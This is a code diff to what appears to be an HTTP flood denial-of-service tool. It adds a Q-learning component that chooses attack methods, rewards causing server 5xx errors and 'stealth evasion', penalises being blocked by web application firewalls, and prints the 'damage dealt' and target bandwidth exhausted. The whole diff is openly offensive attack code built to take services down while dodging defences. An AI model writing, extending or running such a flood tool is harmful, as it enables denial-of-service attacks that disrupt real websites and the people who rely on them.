@@ -1232,6 +1232,45 @@ class AsyncHttpFlood(Thread):
             if int(REQUESTS_SENT) < 1000:
                 print(f"{bcolors.OKGREEN}[CHAOS ML] Sufficient data gathered. Predictive neural heuristic model activated.{bcolors.RESET}")
                 
+    def _chaos_get_rl_state(self):
+        """Quantize the continuous battleground into a discrete state for the Q-Table."""
+        intel = self._chaos_intel
+        waf = intel.get("waf_type", "none")
+        health = "STABLE"
+        
+        rt = intel.get("response_time_ms", 100)
+        history = intel.get("health_history", [])
+        if len(history) > 3:
+            avg = sum(history[-3:]) / 3
+            if avg > rt * 2: health = "WEAK"
+            if avg > rt * 5: health = "CRITICAL"
+            
+        anomaly = "HOT" if intel.get("anomaly_score", 0) > 60 else "COLD"
+        
+        # State format: WAF_Status_Health_Anomaly
+        return f"{waf}_{intel['phase']}_{health}_{anomaly}"
+
+    def _chaos_rl_update_q(self, state, action, reward, next_state):
+        """Update Q-Table using Bellman Equation.
+        Q(s,a) = Q(s,a) + alpha * [reward + gamma * max(Q(s')) - Q(s,a)]"""
+        intel = self._chaos_intel
+        q = intel["q_table"]
+        alpha = intel["q_learning_rate"]
+        gamma = intel["q_discount_factor"]
+        
+        if state not in q: q[state] = {}
+        if action not in q[state]: q[state][action] = 0.0
+        
+        # Max future reward
+        max_future_q = 0.0
+        if next_state in q and q[next_state]:
+            max_future_q = max(q[next_state].values())
+            
+        # Update rule
+        current_q = q[state][action]
+        new_q = current_q + alpha * (reward + gamma * max_future_q - current_q)
+        q[state][action] = round(new_q, 3)
+
     def _chaos_ml_predict(self, method):
         """Predict the probability of success for a given method using the micro-model."""
         intel = self._chaos_intel
@@ -2782,6 +2821,11 @@ class HttpFlood(Thread):
         "ml_predictions_enabled": False, # Activates when enough data collected
         "bandwidth_kb": 0.0,      # Estimated bandwidth (Megabytes) forced from target
         "wasted_server_cpu": 0,   # Estimated CPU cycles wasted by our attack
+        "q_table": {},            # Reinforcement Learning State-Action Space
+        "q_learning_rate": 0.1,   # Alpha: How quickly it learns new patterns
+        "q_discount_factor": 0.9, # Gamma: Importance of future rewards
+        "q_epsilon": 0.4,         # Epsilon: Exploration rate (decays over time)
+        "current_state": "PROBE", # Simplified state for RL tracking
     }
     
     # ========================================================================
@@ -4859,6 +4903,23 @@ class HttpFlood(Thread):
         
         # Train ML Model
         self._chaos_ml_train(method_name, success)
+        
+        # Q-Learning Bellman Update
+        old_state = intel.get("current_state", "PROBE")
+        new_state = self._chaos_get_rl_state()
+        intel["current_state"] = new_state
+        
+        # Calculate Reward
+        reward = 0
+        if success:
+            reward = 10
+            if got_5xx: reward = 50 # Massive reward for causing server errors
+            if method_name == intel.get("battering_ram_method"): reward += 5 # Bonus for stealth evasion
+        else:
+            reward = -10 # Punishment for being blocked
+            if intel.get("anomaly_score", 0) > 80: reward = -30 # Severe punishment for triggering WAF alarm
+            
+        self._chaos_rl_update_q(old_state, method_name, reward, new_state)
         # Calculate Wasted Bandwidth
         self._chaos_track_bandwidth(method_name, success)
         
@@ -4981,6 +5042,24 @@ class HttpFlood(Thread):
             "BOT": 1, "COOKIE": 1, "STEALTH_JA3": 1,
         })
         
+        # Phase 2.6: Reinforcement Learning (Q-Table) Action Injection - Epsilon Greedy
+        state = intel.get("current_state", "PROBE")
+        q = intel.get("q_table", {})
+        
+        # Decay Epsilon (Exploration becomes Exploitation over time)
+        if intel["total_executions"] % 100 == 0:
+            intel["q_epsilon"] = max(intel["q_epsilon"] * 0.95, 0.05)
+            
+        if state in q and q[state]:
+            # Exploit: Pick best action from Q-Table
+            if randint(1, 100) > (intel["q_epsilon"] * 100):
+                best_q_method = max(q[state], key=q[state].get)
+                if q[state][best_q_method] > 0 and best_q_method in weights:
+                    # ML RL Agent overrides decision and strongly suggests this method
+                    weights[best_q_method] = max(weights.get(best_q_method, 0) * 3, 50)
+                    if int(REQUESTS_SENT) < 2500 and intel["total_executions"] % 50 == 0:
+                        pass # Quiet logging
+
         # Phase 3: EXECUTE with intelligent method selection
         method_map = {
             "GET": self.GET, "POST": self.POST, "STRESS": self.STRESS,
@@ -5201,7 +5280,9 @@ class HttpFlood(Thread):
                 
                 print(f"  Damage Dealt: {dmg_str} | Wasted CPU: {intel.get('wasted_server_cpu', 0)} cycles")
                 print(f"  Bandwidth   : {bcolors.OKCYAN}{bw_str}{bcolors.RESET} of target data traffic exhausted")
-                print(f"  ML Predictor: {ml_status} (Accuracy: {intel.get('ml_model', {}).get('success', 0) / max(intel.get('ml_model', {}).get('total', 1), 1):.0%} avg probability)")
+                q_size = sum(len(actions) for actions in intel.get("q_table", {}).values())
+                eps = intel.get("q_epsilon", 0.4) * 100
+                print(f"  ML Predictor: {ml_status} | RL Q-Table States: {q_size} (Exploration: {eps:.1f}%)")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
